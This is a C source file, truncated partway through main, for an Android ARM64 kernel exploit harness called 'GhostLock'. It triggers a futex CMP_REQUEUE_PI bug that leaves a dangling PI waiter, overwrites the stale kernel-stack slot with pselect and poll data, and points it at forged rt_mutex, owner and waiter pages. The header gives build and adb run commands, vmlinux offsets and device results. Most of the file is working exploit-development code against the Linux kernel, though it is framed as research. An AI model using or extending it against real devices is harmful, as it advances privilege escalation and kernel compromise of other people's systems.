/*
 * ghostlock_chain.c — GhostLock chainwalk validation harness (phase mode).
 *
 * One trial per execution, one question:
 *   does FUTEX_LOCK_PI(f_chain) from a 4th thread read waiter->lock out of
 *   the stamped kernel-stack slot and reach rt_mutex_adjust_prio_chain?
 *
 * Graph preserved until consumer: waiter KEEPS f_chain (no FUPI), owner
 * stays blocked on f_chain, pi_state2 stays allocated. No teardown between
 * EDEADLK and consumer.
 *
 * Phases (one line each, flushed, sufficient to reconstruct after crash):
 *   P0 READY            all threads + pages prepared
 *   P1 TRIGGER_ENTER    before CMP_REQUEUE_PI
 *   P2 EDEADLK          CMP returned 35, dangling pi_blocked_on exists
 *   P3 GRAPH_PRESERVED  no teardown done, waiter woken for stamp only
 *   P4 STAMP_DONE       waiter published SPs (or SKIPPED in nostamp mode)
 *   P5 LOCK_PI_ENTER    consumer flag set, syscall next (no log after this
 *                       on consumer thread before svc)
 *   P5b LOCK_PI_DONE   consumer returned (only if no panic inside walk)
 *   P6 RESULT=<...>    fake page dump + verdict
 *
 * Critical path (waiter stamp -> consumer svc) contains: no printf, no
 * malloc/free, no auxiliary futex, no join, no sleep, no pselect/poll on
 * waiter after last stamp, no setschedparam. Main may usleep (own stack
 * is not under test). Waiter<->main handoff uses atomics on plain words,
 * never a futex (a futex would re-enter the stamped stack).
 *
 * Fake variants (argv[2]):
 *   A  lock==NULL (inert). Walk must stop at next_lock==NULL, no chain.
 *   B  lock=&fake zero page + tree_entry=self. Minimal full walk, owner=0
 *      terminates. Expect: trylock RMW at lock+0x00, dequeue bails,
 *      writes to waiter+0x40/+0x48, enqueue writes waiter ptr to
 *      lock+0x08/+0x10, then owner==0 returns.
 *   C  B + fake owner = second controlled page (observe refcount inc at
 *      owner+0x28 without touching real task).
 *   D  C + owner page carries pi_blocked_on at +0x7f0 -> second fake
 *      waiter (tests recursion read at 0x...4ff0/0x...4ff8).
 *
 * PREEMPT modes (argv[3]):
 *   immediate  stamp -> consumer at once (shortest window)
 *   busy       stamp -> userland busy loop -> consumer (clobber probe)
 *   nostamp    no stamp at all, consumer walks natural stack bytes
 *   pollNone   control for poll series: no poll syscall, park immediately
 *   pollA      STAMP_POLL with events=0x4141 (entry0.key=0x4159 on lock slot)
 *   pollB      STAMP_POLL with events=0x4242 (entry0.key=0x425A on lock slot)
 * Poll reach model (binary, build-aq/vmlinux): table base == waiter base for
 * any pad; lock slot gets small key (fault if reached = reach proof, not a
 * pointer); entries miss waiter by 4B structural. pollA vs pollB must fault
 * at different addresses if reach holds; pollNone must HANG like nostamp.
 *
 * Stack geometry is solved on device in one boot: waiter records SP of
 * the FWRQ svc, then SP of the pselect svc with the same inline-asm
 * probe; main closes the fixed point. All values printed in P4.
 *
 * Build (NDK r29, ARM64, API 28):
 *   aarch64-linux-android28-clang -O2 -Wall -static ghostlock_chain.c -o ghostlock_chain
 * Run:
 *   adb push ghostlock_chain /data/local/tmp/
 *   adb shell /data/local/tmp/ghostlock_chain [pad_hex] [A|B|C|D] [immediate|busy|nostamp|pollNone|pollA|pollB|schedA|schedB|base_t|trig_t|ctrl_t] [busy_iters]
 * Poll series (one boot, same pad, VAR B fake recommended):
 *   pollNone (expect HANG, control) -> pollA (expect PANIC at 0x4159 if reach)
 *   -> pollB (expect PANIC at 0x425A, proves control). No P6 after P5 =
 *   panic in walk (reach); P6 HANG_IN_WALK = no reach (stale lock blocked).
 * OBSERVED 2026-10-01 (aquaman PI.2055, pad 0x0, VAR B): pollNone/pollA/pollB
 * ALL HANG_IN_WALK, zero fake writes, no panic, no reboot. Reach NOT proven.
 * schedA/schedB (6/7) stamp like pollA/pollB, then main runs
 * sched_setscheduler(waiter_tid, SCHED_OTHER) as a MIN_CHAINWALK tiebreaker
 * (P5b lines): panic here proves stale non-NULL + reach; silence keeps both
 * hypotheses. OBSERVED schedA: SETSCHED rc=0, still HANG, no panic.
 *
 * Timeout modes (argv[3], stale-pointer validation, no stamper):
 *   base_t  CONTROL A: same arming, NO CMP_REQUEUE trigger, consumer
 *           LOCK_PI(f_chain) with absolute 3s timeout. Expect ETIMEDOUT.
 *   trig_t  CONTROL B: full GhostLock trigger, NO stamp, consumer
 *           LOCK_PI(f_chain) with absolute 3s timeout. EDEADLK immediate
 *           proves the walk consumed the stale waiter and found the
 *           W->O->W cycle; ETIMEDOUT means walk bailed or slept normal.
 *   ctrl_t  CONTROL D: full trigger, NO stamp, consumer LOCK_PI(f_ctrl)
 *           (unrelated futex, no pi_state) with timeout. Expect 0
 *           (acquired). Proves consumer path + timeout mechanism healthy.
 * Timeout is ABSOLUTE CLOCK_REALTIME (futex_lock_pi hardcodes
 * CLOCK_REALTIME/HRTIMER_MODE_ABS; SYSCALL wrapper does NOT add now for
 * LOCK_PI, unlike WAIT). ETIMEDOUT=110, EDEADLK=35.
 *
 * Natural heap matrix (no stamper, no fake; see
 * reports/ghostlock-heap-consumption.md):
 *   N0 trg_inwin occ_n=0 f_target empty -> TIMEOUT_BLOCK (gate shut)
 *   N1 occ_tgt   occ_n=1 f_target +1 waiter -> EDEADLK_CYCLE (gate open)
 *   N2 occ2_tgt  occ_n=2 f_target +2 waiters -> EDEADLK_CYCLE (stable)
 *   N3 not needed: owner/prio never varied, FULL ignores prio.
 * H16 write matrix (targeted 8B store [W_waiter+0x38]=&f_alt.pi_mutex; see
 * reports/ghostlock-h16-write.md):
 *   h16_static occ_n=0 + f_alt held+occupied, TWO sequential timed
 *   LOCK_PI(f_chain) probes on the same live frame. Both TIMEOUT proves
 *   the slot stayed stable across the H16.4/H16.7 window (safe, no corrupt).
 * H16 alt matrix (second legitimate rt_mutex, no stamper, no fake; see
 * reports/ghostlock-h16-control.md):
 *   L0 f_target state decides (stale waiter->lock is born f_target, immutable)
 *   alt_tgt  occ_n=1 + f_alt held+occupied -> EDEADLK_CYCLE (follows f_target)
 *   alt_only occ_n=0 + f_alt held+occupied -> TIMEOUT_BLOCK (f_alt ignored)
 *   alt_base no trigger, consumer f_alt timed -> TIMEOUT_BLOCK (f_alt valid)
 * H16 source-control (see reports/ghostlock-h16-source-control.md):
 *   h16_static 2x TIMEOUT+TIMEOUT 3000ms on same live frame (slot static,
 *   HARDWARE_REPRODUCED 2026-10-01); pi_state->pi_mutex is LEA +0x10, zero
 *   pointer writers, requeue cannot rebind (PI->PI rejected), H16 source
 *   control NATURALLY IMPOSSIBLE offline, natural retarget HARDWARE_REFUTED.
 * First heap word past waiter->lock is lock+0x00 RMW (trylock);
 * first naturally-alterable heap predicate is lock+0x10 leftmost
 * (HEAP_PREDICATE_0); owner+0x28 is get_task_struct INC on O.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef __NR_gettid
#define __NR_gettid 178
#endif
#define FUTEX_LOCK_PI          6
#define FUTEX_WAIT_REQUEUE_PI  11
#define FUTEX_CMP_REQUEUE_PI   12
#define FUTEX_WAKE             1
#define FUTEX_PRIVATE_FLAG     128
#define EDEADLK                35

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FWAKE (FUTEX_WAKE | FUTEX_PRIVATE_FLAG)

/* from build-aq/vmlinux: 0x70 + 0x120 + 0x1a0 frame chain, waiter at x29+0x80 */
#define WAITER_OFF_SP   0x2b0
#define LAB_PAD        0x120
#define FD_OFF         0x190
/* STAMP_POLL (build-aq/vmlinux, verified offline, see
 * reports/ghostlock-deep-poll.md): SyS_poll 0x40 + do_sys_poll 0x410.
 * stack_pps (head) at x29+0xa0 (256B, entries at +0xc, max 30x8=240B):
 *   entries = SP0-0x3a4 .. SP0-0x2b4 (misses waiter by 4B, structural).
 * poll_wqueues table at x29+0x1a0 (624B, DWARF fbreg-624):
 *   table base = SP0-0x2b0 = waiter base exactly (sys_poll path).
 * table+0x38 (waiter->lock) = inline_entries[0].key = events|0x18 (small);
 * table+0x40 (waiter->prio) = entry0.wait.flags (0). lock small => trylock
 * faults if reached (panic), which IS the reach proof. No pointer control
 * from poll; pointer stamper is future work (spill-based, see report). */
#define POLL_OFF_SP    0x2b0
#define POLL_NFDS      30
#define POLL_EV_A      0x4141
#define POLL_EV_B      0x4242
#define WIN_SLOTS      6
#define PSEL_SIZE      40
#define WIN_LEN        (WIN_SLOTS * PSEL_SIZE)
#define PSEL_NFDS      320

#define RTMW_LOCK      0x38
#define RTMW_PRIO      0x40
#define RTMW_TREE      0x00

#define LOCK_WAIT_LOCK 0x00
#define LOCK_WAITERS   0x08
#define LOCK_LEFTMOST  0x10
#define LOCK_OWNER     0x18

#define OWNER_USAGE_OFF 0x28
#define OWNER_PIBLOCKED 0x7f0

#define ETIMEDOUT 110

static uint32_t f_wait, f_target, f_chain, f_ctrl, f_alt;
static volatile int w_armed, o_started, cmp_done, consumer_in;
static volatile int consumer_entered, consumer_done;
static volatile long consumer_rc;
static volatile int consumer_errno;
static volatile uint64_t g_pad = LAB_PAD;

static unsigned char win[WIN_LEN] __attribute__((aligned(64)));
static void *fake;
static void *fake_owner;             /* VAR C/D only */
static void *fake_waiter2;           /* VAR D only: 2nd waiter for recursion */
static uint64_t *fake8;
static uint64_t *fake_owner8;
static uint64_t sp_psel;
static uint64_t sp_poll;
static volatile uint64_t sp_futex;
static volatile uint64_t sp_pub;
static volatile int g_pub, g_turn, g_stop;
static volatile int w_back;
static int g_pipe[2] = { -1, -1 };     /* STAMP_POLL: pipe read end is queued */

static int g_var = 'B';              /* A|B|C|D */
static int g_mode = 0;               /* 0=immediate 1=busy 2=nostamp 3=pollNone 4=pollA 5=pollB 6=schedA 7=schedB 8=base_t 9=trig_t 10=ctrl_t 11=tgt_t 12=trg_tgt 13=trg_inwin 14=pos_cycle 15=occ_tgt 16=occ_base 17=occ2_tgt 18=occ2_base  19=alt_tgt 20=alt_only 21=alt_base 22=h16_static */
static volatile uint64_t g_busy = 200000;
static int g_pin = 0;
static volatile int w_tid;           /* waiter kernel tid for sched probe */
static volatile uint64_t g_consumer_ms; /* elapsed ms for timed consumer */
/* CASE C/D: the consumer's lock target and the second (f_target) probe.
 * g_sel: 'c'=f_chain (default) 't'=f_target 'x'=f_ctrl 'a'=f_alt. */
static int g_sel = 'c';
static int g_second = 0;             /* do a second timed LOCK_PI(f_target) after the first */
/* Fire the consumer while W is STILL inside futex_wait_queue_me. The old
 * flow waited for w_back, which only happens after W's own 30s hrtimer
 * expires, i.e. after the FWRQ frame is dead. Measuring the stale pointer
 * after the frame died measures nothing. */
static int g_inwin = 0;
static volatile long c2_rc;
static volatile int c2_errno;
static volatile uint64_t c2_ms;
static volatile int c2_done;
static volatile uint32_t *g_lock1;
static volatile int o_armed;         /* owner has acquired f_target */
static volatile int f_target_occupied; /* 4th thread parked on f_target */
static volatile int occ_go;            /* release the 4th thread */
static volatile int occ2_parked;       /* 2nd occ thread reached LOCK_PI */
static int g_occ_n = 0;                /* O0=0 O1=1 O2=2 waiters on f_target */
static volatile int a_armed;           /* alt owner holds f_alt */
static volatile int alt_go;            /* release the alt occ thread */
static volatile int alt_parked;        /* alt occ thread reached LOCK_PI */
static int g_alt = 0;                  /* 0=off 1=f_alt held+occupied (H16 L1 candidate) */
/* W's FWRQ timeout. futex_wake() refuses a PI futex (this->rt_waiter set ->
 * -EINVAL), so the only way W leaves FWRQ is this own hrtimer: the delay
 * between the trigger and the consumer IS this value. 30s = dead window,
 * the waiter bytes are long gone by then. */
static long g_fwrq_sec = 30;

static void pin_cpu0(void) {
    cpu_set_t m;
    CPU_ZERO(&m);
    CPU_SET(0, &m);
    sched_setaffinity(0, sizeof(m), &m);
}

/* raw syscall, no glibc frame between the asm SP adjust and the svc.
 * bionic's syscall() stub is `mov x8,#nr; svc #0` and pushes nothing, so the
 * SP we record here is the SP the kernel sees. */
static long raw_psel(void *rinp, void *routp, void *rexp, uint64_t pad) {
    struct timespec ts = { 0, 0 };
    long r;

    __asm__ volatile("sub sp, sp, %[pad]\n\t"
                     "mov %[out], sp\n\t"
                     : [out] "=r"(sp_psel)
                     : [pad] "r"(pad)
                     : "memory");
    r = syscall(SYS_pselect6, (long)PSEL_NFDS, rinp, routp, rexp, &ts, 0);
    __asm__ volatile("add sp, sp, %[pad]" :: [pad] "r"(pad) : "memory");
    return r;
}

/* STAMP_POLL: same SP probe discipline as raw_psel. win[] reused as
 * struct pollfd[30] (30*8=240=WIN_LEN). timeout=0: no sleep, do_poll runs
 * once, __pollwait queues one entry if fd valid, then poll_freewait cleans
 * up. No alloc for nfds<=30 (stack only). f_chain graph untouched. */
static long raw_poll(void *pfds, int nfds, uint64_t pad) {
    long r;

    __asm__ volatile("sub sp, sp, %[pad]\n\t"
                     "mov %[out], sp\n\t"
                     : [out] "=r"(sp_poll)
                     : [pad] "r"(pad)
                     : "memory");
#ifdef SYS_poll
    r = syscall(SYS_poll, pfds, nfds, 0);
#else
    r = syscall(73, pfds, nfds, 0); /* __NR_poll arm64 */
#endif
    __asm__ volatile("add sp, sp, %[pad]" :: [pad] "r"(pad) : "memory");
    return r;
}

static long xfutex(void *u, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u, op, val, to, u2, v3);
}

/* sp_futex is the calibration anchor, so only the waiter's WAIT_REQUEUE_PI is
 * allowed to set it. The owner and the consumer call plain xfutex(). */
__attribute__((noinline)) static long xfutex_fwrq(void *u, int op, uint32_t val,
                                                  void *to, void *u2,
                                                  uint32_t v3) {
    long r;

    __asm__ volatile("mov %[out], sp" : [out] "=r"(sp_futex) :: "memory");
    r = xfutex(u, op, val, to, u2, v3);
    return r;
}

/* Fill win[] per VAR. Called on waiter before each pselect so the bytes the
 * kernel copies are always the current variant. In nostamp mode it is still
 * called once so win[] contents are defined for the report. */
static void fill_win(void) {
    memset(win, 0, sizeof(win));
    *(uint64_t *)&win[RTMW_TREE + 0x00] = (uint64_t)(uintptr_t)win;
    *(uint64_t *)&win[RTMW_TREE + 0x08] = (uint64_t)(uintptr_t)win;
    *(uint64_t *)&win[RTMW_TREE + 0x10] = (uint64_t)(uintptr_t)win;
    if (g_var == 'A') {
        *(uint64_t *)&win[RTMW_LOCK] = 0;
    } else {
        *(uint64_t *)&win[RTMW_LOCK] = (uint64_t)(uintptr_t)fake;
    }
    *(uint32_t *)&win[RTMW_PRIO] = 1; /* != 120, FULL ignores match anyway */
}

/* Fill win[] as struct pollfd[30] for STAMP_POLL. win is 240B = 30*8B.
 * pollfd layout: int fd +0x0, short events +0x4, short revents +0x6.
 * fd[0] = pipe read end (valid, has poll op -> __pollwait queues entry0,
 *   entry0.key = events|0x18 lands on waiter->lock). Rest = -1 (no queue,
 *   but entries still copy user bytes to stack_pps). events = VAR signature.
 * revents left 0 (kernel overwrites with mask, adjacent to waiter, 4B gap). */
static void fill_poll(void) {
    int ev = (g_mode == 5 || g_mode == 7) ? POLL_EV_B : POLL_EV_A; /* pollB/schedB vs pollA/schedA */
    for (int i = 0; i < POLL_NFDS; i++) {
        int fd = (i == 0 && g_pipe[0] >= 0) ? g_pipe[0] : -1;
        *(int *)&win[i * 8 + 0] = fd;
        *(uint16_t *)&win[i * 8 + 4] = (uint16_t)ev;
        *(uint16_t *)&win[i * 8 + 6] = 0;
    }
}

static const char *mode_name(int m) {
    switch (m) {
    case 0: return "immediate";
    case 1: return "busy";
    case 2: return "nostamp";
    case 3: return "pollNone";
    case 4: return "pollA";
    case 5: return "pollB";
    case 6: return "schedA";
    case 7: return "schedB";
    case 8: return "base_t";
    case 9: return "trig_t";
    case 10: return "ctrl_t";
    case 11: return "tgt_t";
    case 12: return "trg_tgt";
    case 13: return "trg_inwin";
    case 14: return "pos_cycle";
    case 15: return "occ_tgt";
    case 16: return "occ_base";
    case 17: return "occ2_tgt";
    case 18: return "occ2_base";
    case 19: return "alt_tgt";
    case 20: return "alt_only";
    case 21: return "alt_base";
    case 22: return "h16_static";
    default: return "immediate";
    }
}

static void *waiter_fn(void *u) {
    struct timespec ts;
    (void)u;

    if (g_pin)
        pin_cpu0();
    w_tid = syscall(__NR_gettid); /* before any futex; own stack only */
    if (g_mode == 14)
        printf("P0 THREADS main_pid=%d main_tid=%d W_tid=%d\n",
               (int)getpid(), (int)w_tid, (int)w_tid);
    if (xfutex(&f_chain, FLPI, 0, 0, 0, 0))
        return 0;
    if (g_mode == 14) {
        /* POSITIVE CONTROL: block on f_target, which O holds. Live, valid
         * waiter on OUR OWN live stack: no futex_wait_requeue_pi, no stale
         * pointer, no rollback. */
        while (!o_armed)
            __asm__ volatile("" ::: "memory");
        w_armed = 1;
        errno = 0;
        xfutex(&f_target, FLPI, 0, 0, 0, 0);
        printf("P0 W_DID_NOT_BLOCK f_target tid=%d\n", (int)syscall(__NR_gettid));
        return 0;
    }
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += g_fwrq_sec;
    w_armed = 1;
    __asm__ volatile("" ::: "memory");
    xfutex_fwrq(&f_wait, FWRQ, 0, &ts, &f_target, 0);

    /* Rollback done. Below is stamp only, then park. No FUPI, no sleep. */
    while (!cmp_done)
        __asm__ volatile("" ::: "memory");

    if (g_inwin) {
        /* Stay INSIDE the FWRQ frame: rt_waiter lives there and
         * W->pi_blocked_on points into it. Returning would free the frame
         * and the next consumer would read recycled stack, which is what
         * made the previous trials report TIMEOUT_BLOCK for free. The
         * hrtimer is the only exit; main does not need us back. */
        w_back = 1;
        for (;;)
            __asm__ volatile("" ::: "memory");
    }

    if (g_mode == 2 || g_mode == 3 || g_mode >= 8) {
        /* nostamp / pollNone / *_t: touch nothing, park immediately. Natural
         * stack bytes are whatever the FWRQ frame left behind. The *_t modes
         * are the stale-pointer controls: no stamp by design. */
        fill_win(); /* define win[] for report only, no syscall */
        if (g_mode == 3)
            fill_poll(); /* define poll bytes too, still no syscall */
        w_back = 1;
        __atomic_store_n(&g_pub, 1, __ATOMIC_RELEASE);
        for (;;)
            __asm__ volatile("" ::: "memory");
    }

    if (g_mode == 4 || g_mode == 5 || g_mode == 6 || g_mode == 7) {
        /* STAMP_POLL: single deep poll, then park. No calibration loop:
         * kernel frames are fixed (table always at waiter for any pad),
         * so pad independence is the point. Main reads one SP publish.
         * No FUPI, no sleep, no aux futex. poll timeout=0, no blocking.
         * schedA/schedB (6/7) stamp like pollA/pollB; main additionally
         * runs sched_setscheduler(waiter) after the consumer hangs, as a
         * MIN_CHAINWALK tiebreaker (rt_mutex_adjust_pi path). */
        uint64_t pad = g_pad;

        fill_poll(); /* win as pollfd[30], ev from pollA/pollB */
        raw_poll(win, POLL_NFDS, pad);
        sp_pub = sp_poll;
        __atomic_store_n(&g_pub, 1, __ATOMIC_RELEASE);
        w_back = 1;
        for (;;)
            __asm__ volatile("" ::: "memory");
    }

    for (;;) {
        uint64_t pad = g_pad;
        int my_turn = __atomic_load_n(&g_turn, __ATOMIC_ACQUIRE);

        fill_win();
        raw_psel(win, win + PSEL_SIZE, win + 2 * PSEL_SIZE, pad);
        sp_pub = sp_psel;
        __atomic_store_n(&g_pub, 1, __ATOMIC_RELEASE);
        while (__atomic_load_n(&g_turn, __ATOMIC_ACQUIRE) == my_turn)
            __asm__ volatile("yield" ::: "memory");
        if (__atomic_load_n(&g_stop, __ATOMIC_ACQUIRE))
            break;
        __atomic_store_n(&g_pub, 0, __ATOMIC_RELEASE);
    }
    w_back = 1;

    for (;;)
        __asm__ volatile("" ::: "memory");
}

/* Section 13 helper: 4th thread parked on f_target so f_target.pi_mutex has
 * a live waiter (its rbtree is non-empty) when the consumer's stale walk
 * reaches rt_mutex_top_waiter(). Ordinary PI usage, no injected data. */
static void *occ_fn(void *u) {
    (void)u;
    if (g_pin)
        pin_cpu0();
    while (!occ_go)
        __asm__ volatile("" ::: "memory");
    if (u)
        __atomic_store_n(&occ2_parked, 1, __ATOMIC_RELEASE);
    errno = 0;
    xfutex(&f_target, FLPI, 0, 0, 0, 0);
    f_target_occupied = 1;   /* only reached if f_target was free */
    return 0;
}

/* Section H16: alt owner holds f_alt without blocking (pure holder, no chain
 * edge). f_alt.pi_mutex is a second legitimate rt_mutex: owner A, heap,
 * valid. Never released during the trial. */
static void *alt_owner_fn(void *u) {
    (void)u;
    if (g_pin)
        pin_cpu0();
    if (xfutex(&f_alt, FLPI, 0, 0, 0, 0))
        return 0;
    a_armed = 1;
    for (;;)
        __asm__ volatile("" ::: "memory");
}

/* Section H16: parks exactly 1 waiter on f_alt so f_alt.pi_mutex has a live
 * leftmost, same ordinary PI usage as occ_fn. No injected data. */
static void *alt_occ_fn(void *u) {
    (void)u;
    if (g_pin)
        pin_cpu0();
    while (!alt_go)
        __asm__ volatile("" ::: "memory");
    __atomic_store_n(&alt_parked, 1, __ATOMIC_RELEASE);
    errno = 0;
    xfutex(&f_alt, FLPI, 0, 0, 0, 0);
    return 0;
}

static void *owner_fn(void *u) {
    (void)u;
    if (g_pin)
        pin_cpu0();
    if (xfutex(&f_target, FLPI, 0, 0, 0, 0))
        return 0;
    o_armed = 1;
    while (!w_armed)
        __asm__ volatile("" ::: "memory");
    o_started = 1;
    errno = 0;
    if (g_mode == 14) {
        /* POSITIVE CONTROL: real PI cycle, no requeue, no stale pointer.
         * W holds f_chain and is blocked on f_target; we hold f_target and
         * now block on f_chain. Every pi_blocked_on here is VALID and live.
         * The kernel MUST return EDEADLK from rt_mutex_adjust_prio_chain. If
         * it returns anything else the walk path is not what we think and
         * every TIMEOUT_BLOCK in this report is uninterpretable. */
        long rr = xfutex(&f_chain, FLPI, 0, 0, 0, 0);
        printf("P0 POSITIVE_CONTROL lock_pi(f_chain) rc=%ld errno=%d (%s)\n",
               rr, errno, strerror(errno));
        w_back = 1;
        return 0;
    }
    xfutex(&f_chain, FLPI, 0, 0, 0, 0);
    return 0;
}

static void *consumer_fn(void *u) {
    long r;
    (void)u;
    if (g_pin)
        pin_cpu0();
    while (!consumer_in)
        __asm__ volatile("" ::: "memory");
    /* Flag BEFORE the svc so main can print P5 even if we never return. */
    __atomic_store_n(&consumer_entered, 1, __ATOMIC_RELEASE);
    __asm__ volatile("" ::: "memory");
    errno = 0;
    if (g_mode >= 8) {
        /* Timed consumer: absolute CLOCK_REALTIME +3s. futex_lock_pi takes
         * absolute time (no now-add, unlike WAIT). EDEADLK returns
         * immediately on cycle detect; ETIMEDOUT after ~3s on plain block. */
        struct timespec to, start, end;
        clock_gettime(CLOCK_REALTIME, &to);
        clock_gettime(CLOCK_MONOTONIC, &start);
        to.tv_sec += 3;
        r = xfutex(g_lock1, FLPI, 0, &to, 0, 0);
        clock_gettime(CLOCK_MONOTONIC, &end);
        g_consumer_ms = (uint64_t)(end.tv_sec - start.tv_sec) * 1000 +
            (uint64_t)(end.tv_nsec - start.tv_nsec) / 1000000;
        consumer_errno = errno;
        consumer_rc = r;
        __atomic_store_n(&consumer_done, 1, __ATOMIC_RELEASE);

        /* CASE D second probe: f_target is owned by O, whose pi_blocked_on is
         * a VALID waiter (not stale). A walk from f_target is therefore the
         * control for "does the consumer/walk path work on this device at
         * all", independent of whatever W's stale pointer says. */
        if (g_second) {
            struct timespec t2, s2, e2;
            clock_gettime(CLOCK_REALTIME, &t2);
            clock_gettime(CLOCK_MONOTONIC, &s2);
            t2.tv_sec += 3;
            errno = 0;
            r = xfutex(g_second == 2 ? (void *)g_lock1 : (void *)&f_target,
                       FLPI, 0, &t2, 0, 0);
            clock_gettime(CLOCK_MONOTONIC, &e2);
            c2_ms = (uint64_t)(e2.tv_sec - s2.tv_sec) * 1000 +
                (uint64_t)(e2.tv_nsec - s2.tv_nsec) / 1000000;
            c2_errno = errno;
            c2_rc = r;
            __atomic_store_n(&c2_done, 1, __ATOMIC_RELEASE);
        }
        return 0;
    } else {
        r = xfutex(&f_chain, FLPI, 0, 0, 0, 0);
        consumer_errno = errno;
        consumer_rc = r;
    }
    __atomic_store_n(&consumer_done, 1, __ATOMIC_RELEASE);
    return 0;
}

static void setup_fake(void) {
    /* fake: played as rt_mutex. mlock so it never faults. */
    memset(fake, 0, 4096);
    fake8 = fake;
    /* wait_lock=0: trylock must succeed. waiters/leftmost=0: empty tree.
     * owner per VAR. */
    if (g_var == 'A') {
        /* lock word unused; keep zero for report clarity */
    } else if (g_var == 'B') {
        fake8[LOCK_OWNER / 8] = 0; /* terminator: walk returns 0 */
    } else if (g_var == 'C' || g_var == 'D') {
        memset(fake_owner, 0, 4096);
        fake_owner8 = fake_owner;
        fake8[LOCK_OWNER / 8] = (uint64_t)(uintptr_t)fake_owner;
        /* owner+0x28 refcount starts 0 -> inc observable */
        if (g_var == 'D') {
            memset(fake_waiter2, 0, 4096);
            *(uint64_t *)((char *)fake_waiter2 + RTMW_LOCK) =
                (uint64_t)(uintptr_t)fake;
            *(uint32_t *)((char *)fake_waiter2 + RTMW_PRIO) = 1;
            *(uint64_t *)((char *)fake_owner + OWNER_PIBLOCKED) =
                (uint64_t)(uintptr_t)fake_waiter2;
        }
    }
}

int main(int argc, char **argv) {
    pthread_t w, o, c, occ, occ2, alto, altocc;
    int spins, attempt;

    setbuf(stdout, 0);
    if (argc > 1)
        g_pad = strtoull(argv[1], 0, 0);
    if (argc > 2)
        g_var = argv[2][0];
    if (argc > 3) {
        if (!strcmp(argv[3], "busy"))
            g_mode = 1;
        else if (!strcmp(argv[3], "nostamp"))
            g_mode = 2;
        else if (!strcmp(argv[3], "pollNone"))
            g_mode = 3;
        else if (!strcmp(argv[3], "pollA"))
            g_mode = 4;
        else if (!strcmp(argv[3], "pollB"))
            g_mode = 5;
        else if (!strcmp(argv[3], "schedA"))
            g_mode = 6;
        else if (!strcmp(argv[3], "schedB"))
            g_mode = 7;
        else if (!strcmp(argv[3], "base_t"))
            g_mode = 8;
        else if (!strcmp(argv[3], "trig_t"))
            g_mode = 9;
        else if (!strcmp(argv[3], "ctrl_t"))
            g_mode = 10;
        else if (!strcmp(argv[3], "tgt_t"))
            g_mode = 11;
        else if (!strcmp(argv[3], "trg_tgt"))
            g_mode = 12;
        else if (!strcmp(argv[3], "trg_inwin"))
            g_mode = 13;
        else if (!strcmp(argv[3], "pos_cycle"))
            g_mode = 14;
        else if (!strcmp(argv[3], "occ_tgt"))
            g_mode = 15;
        else if (!strcmp(argv[3], "occ_base"))
            g_mode = 16;
        else if (!strcmp(argv[3], "occ2_tgt"))
            g_mode = 17;
        else if (!strcmp(argv[3], "occ2_base"))
            g_mode = 18;
        else if (!strcmp(argv[3], "alt_tgt"))
            g_mode = 19;
        else if (!strcmp(argv[3], "alt_only"))
            g_mode = 20;
        else if (!strcmp(argv[3], "alt_base"))
            g_mode = 21;
        else if (!strcmp(argv[3], "h16_static"))
            g_mode = 22;
        else
            g_mode = 0;
    }
    if (argc > 4)
        g_busy = strtoull(argv[4], 0, 0);
    if (argc > 5 && !strcmp(argv[5], "pin"))
        g_pin = 1;
    if (argc > 6)
        g_fwrq_sec = strtol(argv[6], 0, 0);
    /* CASE C: baseline, no GhostLock, lock f_target. CASE D: full trigger,
     * lock f_chain then f_target. */
    if (g_mode == 11) {
        g_sel = 't';
        g_lock1 = &f_target;
        g_inwin = 1;
    } else if (g_mode == 12) {
        g_sel = 'c';
        g_lock1 = &f_chain;
        g_second = 1;
        g_inwin = 1;
    } else if (g_mode == 13) {
        g_sel = 'c';
        g_lock1 = &f_chain;
        g_inwin = 1;
    } else if (g_mode == 14) {
        /* POSITIVE CONTROL, see owner_fn/waiter_fn. */
        g_sel = 'c';
        g_lock1 = &f_chain;
        g_inwin = 1;
    } else if (g_mode == 15 || g_mode == 16) {
        g_sel = 'c';
        g_lock1 = &f_chain;
        g_inwin = 1;
        g_occ_n = 1;
    } else if (g_mode == 17 || g_mode == 18) {
        g_sel = 'c';
        g_lock1 = &f_chain;
        g_inwin = 1;
        g_occ_n = 2;
    } else if (g_mode == 19) {
        g_sel = 'c';
        g_lock1 = &f_chain;
        g_inwin = 1;
        g_occ_n = 1;
        g_alt = 1;
    } else if (g_mode == 20) {
        g_sel = 'c';
        g_lock1 = &f_chain;
        g_inwin = 1;
        g_occ_n = 0;
        g_alt = 1;
    } else if (g_mode == 21) {
        g_sel = 'a';
        g_lock1 = &f_alt;
        g_inwin = 1;
        g_alt = 1;
    } else if (g_mode == 22) {
        /* FASE2 safe observability: alt graph armed (f_alt held+occupied)
         * but consumer walks f_chain TWICE (first + second probe both
         * f_chain). No corruption. TIMEOUT+TIMEOUT = slot static. */
        g_sel = 'c';
        g_lock1 = &f_chain;
        g_second = 2; /* 2 = repeat same target, see consumer_fn */
        g_inwin = 1;
        g_occ_n = 0;
        g_alt = 1;
    } else if (g_mode == 10) {
        g_sel = 'x';
        g_lock1 = &f_ctrl;
    } else {
        g_lock1 = &f_chain;
    }
    if (g_var != 'A' && g_var != 'B' && g_var != 'C' && g_var != 'D')
        g_var = 'B';

    fake = mmap(0, 4096, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (fake == MAP_FAILED) {
        printf("P0 ABORT mmap fake failed\n");
        return 3;
    }
    mlock(fake, 4096);
    if (g_var == 'C' || g_var == 'D') {
        fake_owner = mmap(0, 4096, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (fake_owner == MAP_FAILED) {
            printf("P0 ABORT mmap owner failed\n");
            return 3;
        }
        mlock(fake_owner, 4096);
    }
    if (g_var == 'D') {
